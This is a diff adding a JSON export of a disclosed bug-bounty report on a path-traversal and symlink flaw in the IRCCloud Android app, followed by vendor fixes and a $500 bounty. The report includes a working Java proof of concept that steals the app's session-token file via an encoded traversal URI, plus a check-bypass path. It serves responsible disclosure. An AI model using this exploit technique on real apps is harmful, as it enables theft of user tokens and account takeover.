@@ -1,0 +1,503 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2017-11-15T15:23:32.512Z", 
+    "voters": [
+        "europa", 
+        "jensec", 
+        "kapytein", 
+        "eveeez", 
+        "axolotl", 
+        "m16", 
+        "luckydivino", 
+        "babayaga_", 
+        "sup3r-b0y", 
+        "lokeshkumarv", 
+        "and 9 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "500.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 288955, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2017-11-15T15:19:14.932Z", 
+    "vulnerability_information": "#Bug description#\n\nHi, I'd like to report a vulnerability which allows to theft arbitrary protected files (and as a result takeover account, because all tokens will be leaked), similar to my bug reported to Harvest https://hackerone.com/reports/161710\n\nThis one is really tricky, passed two days to realize how to exploit that ;)\n\nActivity ``` com.irccloud.android.activity.ShareChooserActivity ``` is exported and designed to allow file sharing from third-party apps to IRC Cloud\n```xml\n        <activity android:excludeFromRecents=\"true\" android:name=\"com.irccloud.android.activity.ShareChooserActivity\" android:theme=\"@style/dawnDialog\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n            </intent-filter>\n            <intent-filter>\n                <action android:name=\"android.intent.action.SEND\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <data android:mimeType=\"application/*\"/>\n                <data android:mimeType=\"audio/*\"/>\n                <data android:mimeType=\"image/*\"/>\n                <data android:mimeType=\"text/*\"/>\n                <data android:mimeType=\"video/*\"/>\n            </intent-filter>\n            <meta-data android:name=\"android.service.chooser.chooser_target_service\" android:value=\".ConversationChooserTargetService\"/>\n        </activity>\n```\n\n```java\n    protected void onResume() {\n        //...\n        if (getSharedPreferences(\"prefs\", 0).getString(\"session_key\", \"\").length() > 0) {\n            \t//...\n                this.mUri = (Uri) getIntent().getParcelableExtra(\"android.intent.extra.STREAM\"); // getting attacker provided uri\n                if (this.mUri != null) {\n                    this.mUri = MainActivity.makeTempCopy(this.mUri, this); // copying file from this uri to /data/data/com.irccloud.android/cache/\n                }\n```\n\n```java\n    public static Uri makeTempCopy(Uri fileUri, Context context, String original_filename) { // original_filename = mUri.getLastPathSegment()\n        //...\n        try {\n            Uri out = Uri.fromFile(new File(context.getCacheDir(), original_filename));\n            Log.d(\"IRCCloud\", \"Copying file to \" + out);\n            InputStream is = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openInputStream(fileUri);\n            OutputStream os = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openOutputStream(out);\n            byte[] buffer = new byte[8192];\n            while (true) {\n                int len = is.read(buffer);\n                if (len != -1) {\n                    os.write(buffer, 0, len);\n                //...\n```\n\nIt means that the specified file will be copied to ``` /data/data/com.irccloud.android/cache/ ``` with original name. Original name is ``` getLastPathSegment() ``` from the specified uri. But there is one thing: this method decodes last path segment. This is my PoC:\n```java\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        // path to sdcard (encoded relative path from \"/data/data/com.irccloud.android/cache/\")\n        String zhk = \"..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml\";\n        // absolute path to a file, pointing to sumlink\n        String appDir = \"/data/data/\" + getPackageName();\n        String deepPath = appDir + \"/x/x/x/x/\";\n\n        new File(deepPath).mkdirs();\n\n        String sumlink = deepPath + zhk;\n        try {\n            File sumlinkFile = new File(Uri.decode(sumlink)).getCanonicalFile();\n            sumlinkFile.getParentFile().mkdirs();\n\n            Runtime.getRuntime().exec(\"ln -s /data/data/com.irccloud.android/shared_prefs/prefs.xml \"\n                    + sumlinkFile.getAbsolutePath()).waitFor();\n        }\n        catch(Exception e) {\n            // should be never thrown\n            throw new RuntimeException(e);\n        }\n        grant777PermissionToEverything(new File(appDir));\n\n        Uri uri = Uri.parse(\"file://\" + sumlink); // file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml\n\n        Intent intent = new Intent();\n        intent.setClassName(\"com.irccloud.android\", \"com.irccloud.android.activity.ShareChooserActivity\");\n        intent.putExtra(\"android.intent.extra.STREAM\", uri);\n        startActivity(intent);\n    }\n\n    private void grant777PermissionToEverything(File dist) {\n        dist.setReadable(true, false);\n        dist.setWritable(true, false);\n        dist.setExecutable(true, false);\n        if(dist.isDirectory()) {\n            for(File child : dist.listFiles()) {\n                grant777PermissionToEverything(child);\n            }\n        }\n    }\n```\n\nResult:\n{F238129}\n{F238128}\n\nIt works so:\n1) I start your activity with the following uri: ``` file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml ```\n2) Canonical file from #2 (``` /data/data/com.attacker/sdcard/prefs.xml ```) is a symlink file pointing to the file I want to theft (``` /data/data/com.irccloud.android/shared_prefs/prefs.xml ```)\n3) In your app ``` original_filename ``` is equal to ``` ../../../../sdcard/prefs.xml ```\n4) \n```java\nInputStream is = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openInputStream(fileUri);\n```\n\nBut ``` openInputStream(...) ``` automatically decodes the specified uri. So it will access my symlink file which points to ``` /data/data/com.irccloud.android/shared_prefs/prefs.xml ```\n5) \n```java\nUri out = Uri.fromFile(new File(context.getCacheDir(), original_filename));\nOutputStream os = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openOutputStream(out);\n```\nIt is equal to \n```java\nUri out = Uri.fromFile(new File(\"/data/data/com.irccloud.android/cache/\", \"../../../../sdcard/prefs.xml\"));\n```\n\nSo it simply outputs the specified file to Sd card.\n\n#How to fix#\nJust specify e.g. current timestamp as a file name, but don't use provided by attacker. In current implementation attacker can force IRC Cloud app to copy arbitrary files to arbitrary directories. File ``` /data/data/com.irccloud.android/shared_prefs/prefs.xml ``` contains ``` session_key ```. In normal situation this file is accessible only to IRC Cloud app. But when it's copied to e.g. Sd card it will be accessible to everyone. But Sd card is only simple example. Attacker can also force IRC Cloud app to copy a file to its internal directory.\n\nBTW this vulnerability also allows to overwrite arbitrary files. So attacker also can replace any your protected files and substitute for example history.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "high", 
+        "author_type": "User"
+    }, 
+    "title": "[IRCCloud Android] Theft of arbitrary files leading to token leakage", 
+    "is_member_of_team?": null, 
+    "vote_count": 19, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "com.irccloud.android", 
+        "max_severity": "critical", 
+        "databaseId": 271, 
+        "asset_type": "GOOGLE_PLAY_APP_ID"
+    }, 
+    "allow_singular_disclosure_at": "2017-12-15T15:19:15.036Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$500", 
+    "attachments": [
+        {
+            "file_name": "Screenshot_2017-11-09-23-21-29.png", 
+            "type": "image/png", 
+            "id": 238128, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/238/128/02be786d66ef5a7bc15aee4a7e1e42f1db8c5768/Screenshot_2017-11-09-23-21-29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222938Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f7041a49344daccfe30eb3df9cc82679a2041b0775dd11f31dbcd5147ae5e49f"
+        }, 
+        {
+            "file_name": "Screenshot_2017-11-09-23-21-21.png", 
+            "type": "image/png", 
+            "id": 238129, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/238/129/0ba86673ab2ad09bcf1133e57c595a36252db0e7/Screenshot_2017-11-09-23-21-21.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222938Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f4fc1776282bd210cd9d908a4ac3e1cb70147937f514a23b4968ad9d0ba1fc1b"
+        }
+    ], 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/238/346/8fd4578a28ea6200d75d61996eaf6ea28ce951a0/app-release.apk?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222938Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5f51fca53171d6e717a4186d27987fb722561db3c06785b74fcbfa79088f6853", 
+                    "type": "application/zip", 
+                    "id": 238346, 
+                    "filename": "app-release.apk"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2017-11-10T10:17:13.166Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-10T10:17:13.166Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "irccloud", 
+            "message": "Forgot to attach PoC APK in the previous message", 
+            "markdown_message": "<p>Forgot to attach PoC APK in the previous message</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2148626, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-10T10:43:01.057Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-10T10:43:01.057Z", 
+            "actor": {
+                "username": "jwheare", 
+                "url": "/jwheare", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/778/a4ee72f52ef5430dc7e3ce3939e385d26312356d_medium.jpeg?1397052045"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "irccloud", 
+            "message": "Thanks for the report. We'll look into this.", 
+            "markdown_message": "<p>Thanks for the report. We&#39;ll look into this.</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 2148726, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-15T12:17:34.044Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-15T12:17:34.044Z", 
+            "actor": {
+                "username": "jwheare", 
+                "url": "/jwheare", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/778/a4ee72f52ef5430dc7e3ce3939e385d26312356d_medium.jpeg?1397052045"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "irccloud", 
+            "message": "Hi there,\n\nThis should be fixed in the latest version of the app (4.4) and this commit https://github.com/irccloud/android/commit/b1e40bb603fe861290558b979d0972b92c22b908\n\nCan you please confirm?", 
+            "markdown_message": "<p>Hi there,</p>\n\n<p>This should be fixed in the latest version of the app (4.4) and this commit <a title=\"https://github.com/irccloud/android/commit/b1e40bb603fe861290558b979d0972b92c22b908\" href=\"/redirect?signature=4520719c4cb226e3849bb2360c63175cfc6dc46c&amp;url=https%3A%2F%2Fgithub.com%2Firccloud%2Fandroid%2Fcommit%2Fb1e40bb603fe861290558b979d0972b92c22b908\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/irccloud/android/commit/b1e40bb603fe861290558b979d0972b92c22b908</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Can you please confirm?</p>\n", 
+            "type": "Activities::BugNeedsMoreInfo", 
+            "id": 2159150, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-15T12:18:02.066Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-15T12:18:02.066Z", 
+            "actor": {
+                "username": "jwheare", 
+                "url": "/jwheare", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/778/a4ee72f52ef5430dc7e3ce3939e385d26312356d_medium.jpeg?1397052045"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "irccloud", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 2159153, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-11-15T12:22:51.648Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-15T12:22:51.648Z", 
+            "actor": {
+                "url": "/irccloud", 
+                "profile": {
+                    "name": "IRCCloud"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/140/5cf4f659a47ba7cb2c48a391465795c07e2ae926_medium.png?1397053347"
+                }
+            }, 
+            "team_handle": "irccloud", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "500.0", 
+            "collaborator": {
+                "username": "bagipro", 
+                "url": "/bagipro"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 2159159, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-15T13:01:23.795Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-15T13:02:07.320Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "irccloud", 
+            "message": "Hi, I believe it's fixed, attacker has no ability anymore to use path traversal to specify output directory. \nhttps://github.com/irccloud/android/blob/master/src/com/irccloud/android/activity/MainActivity.java#L3710\nThis check (and similar too) does nothing, because it should get canonical path, but no absolute. It can be bypassed like so:\n```\n/data/data/./com.irccloud.android/\n```\n(and even if you change to canonical path, it can be bypassed via symlinks)\n\nBut it doesn't matter, because all slashes are replaced\nhttps://github.com/irccloud/android/blob/master/src/com/irccloud/android/activity/MainActivity.java#L3737\n\nLet's disclose my King Zaheck! ;)", 
+            "markdown_message": "<p>Hi, I believe it&#39;s fixed, attacker has no ability anymore to use path traversal to specify output directory. <br>\n<a title=\"https://github.com/irccloud/android/blob/master/src/com/irccloud/android/activity/MainActivity.java#L3710\" href=\"/redirect?signature=7017528ce6b577d93f1516ec44a9b6213fc72543&amp;url=https%3A%2F%2Fgithub.com%2Firccloud%2Fandroid%2Fblob%2Fmaster%2Fsrc%2Fcom%2Firccloud%2Fandroid%2Factivity%2FMainActivity.java%23L3710\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/irccloud/android/blob/master/src/com/irccloud/android/activity/MainActivity.java#L3710</span><i class=\"icon-external-link\"></i></a><br>\nThis check (and similar too) does nothing, because it should get canonical path, but no absolute. It can be bypassed like so:</p>\n<pre class=\"highlight plaintext\"><code>/data/data/./com.irccloud.android/\n</code></pre>\n<p>(and even if you change to canonical path, it can be bypassed via symlinks)</p>\n\n<p>But it doesn&#39;t matter, because all slashes are replaced<br>\n<a title=\"https://github.com/irccloud/android/blob/master/src/com/irccloud/android/activity/MainActivity.java#L3737\" href=\"/redirect?signature=1d6c909d7bdbd3918bd7a943807a4a72628ddbe4&amp;url=https%3A%2F%2Fgithub.com%2Firccloud%2Fandroid%2Fblob%2Fmaster%2Fsrc%2Fcom%2Firccloud%2Fandroid%2Factivity%2FMainActivity.java%23L3737\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/irccloud/android/blob/master/src/com/irccloud/android/activity/MainActivity.java#L3737</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Let&#39;s disclose my King Zaheck! ;)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2159197, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "bagipro", 
+                "url": "/bagipro"
+            }, 
+            "created_at": "2017-11-15T15:18:21.878Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-15T15:18:21.878Z", 
+            "actor": {
+                "username": "jwheare", 
+                "url": "/jwheare", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/778/a4ee72f52ef5430dc7e3ce3939e385d26312356d_medium.jpeg?1397052045"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "irccloud", 
+            "message": "Thanks very much.", 
+            "markdown_message": "<p>Thanks very much.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 2159438, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-15T15:19:14.979Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-15T15:19:14.979Z", 
+            "actor": {
+                "username": "jwheare", 
+                "url": "/jwheare", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/778/a4ee72f52ef5430dc7e3ce3939e385d26312356d_medium.jpeg?1397052045"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "irccloud", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2159440, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-15T15:19:39.875Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-15T15:19:39.875Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "irccloud", 
+            "message": "Can you please update title from ``` Theft or ``` to ``` Theft of ```? It's a typo", 
+            "markdown_message": "<p>Can you please update title from <code>Theft or</code> to <code>Theft of</code>? It&#39;s a typo</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2159442, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-15T15:20:30.153Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-15T15:20:30.153Z", 
+            "actor": {
+                "username": "jwheare", 
+                "url": "/jwheare", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/778/a4ee72f52ef5430dc7e3ce3939e385d26312356d_medium.jpeg?1397052045"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_title": "[IRCCloud Android] Theft of arbitrary files leading to token leakage", 
+                "old_title": "[IRCCloud Android] Theft or arbitrary files leading to token leakage"
+            }, 
+            "team_handle": "irccloud", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportTitleUpdated", 
+            "id": 2159447, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-15T15:23:32.552Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-15T15:23:32.552Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "irccloud", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2159454, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-15T15:23:32.648Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-15T15:23:32.648Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "irccloud", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 2159455, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-11T11:03:58.761Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-11T11:03:58.761Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "irccloud", 
+            "message": "@jwheare \nI would suggest to add more protections. Attacker still able to upload protected files to public chats where they are available for everyone. Please validate the given uri and don't run\n```java\n InputStream is = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openInputStream(fileUri);\n```\nuntil you're sure the canonical file and all symlinks are not pointing to your internal files (or simply disallow use of symlinks, because normal apps don't use them)", 
+            "markdown_message": "<p><a href=\"/jwheare\">@jwheare</a> <br>\nI would suggest to add more protections. Attacker still able to upload protected files to public chats where they are available for everyone. Please validate the given uri and don&#39;t run</p>\n<pre class=\"highlight java\"><code> <span class=\"n\">InputStream</span> <span class=\"n\">is</span> <span class=\"o\">=</span> <span class=\"n\">IRCCloudApplication</span><span class=\"o\">.</span><span class=\"na\">getInstance</span><span class=\"o\">().</span><span class=\"na\">getApplicationContext</span><span class=\"o\">().</span><span class=\"na\">getContentResolver</span><span class=\"o\">().</span><span class=\"na\">openInputStream</span><span class=\"o\">(</span><span class=\"n\">fileUri</span><span class=\"o\">);</span>\n</code></pre>\n<p>until you&#39;re sure the canonical file and all symlinks are not pointing to your internal files (or simply disallow use of symlinks, because normal apps don&#39;t use them)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2590085, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-11T13:55:06.504Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-11T13:55:06.504Z", 
+            "actor": {
+                "username": "jwheare", 
+                "url": "/jwheare", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/778/a4ee72f52ef5430dc7e3ce3939e385d26312356d_medium.jpeg?1397052045"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "irccloud", 
+            "message": "How does this change seem to you? https://github.com/irccloud/android/commit/4eb1facf3101312e3ed5856318ba6169be8c1322", 
+            "markdown_message": "<p>How does this change seem to you? <a title=\"https://github.com/irccloud/android/commit/4eb1facf3101312e3ed5856318ba6169be8c1322\" href=\"/redirect?signature=2f42361221b9eaa59ffd523cb0985cb7b9d9630c&amp;url=https%3A%2F%2Fgithub.com%2Firccloud%2Fandroid%2Fcommit%2F4eb1facf3101312e3ed5856318ba6169be8c1322\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/irccloud/android/commit/4eb1facf3101312e3ed5856318ba6169be8c1322</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2590459, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-11T14:08:26.025Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-11T14:08:46.721Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "irccloud", 
+            "message": "@jwheare \nSeems a good whitelist for ``` /data/data/com.irccloud.android/cache/* ```. Thanks!", 
+            "markdown_message": "<p><a href=\"/jwheare\">@jwheare</a> <br>\nSeems a good whitelist for <code>/data/data/com.irccloud.android/cache/*</code>. Thanks!</p>\n", 
+            "type": "Activities::Comment", 
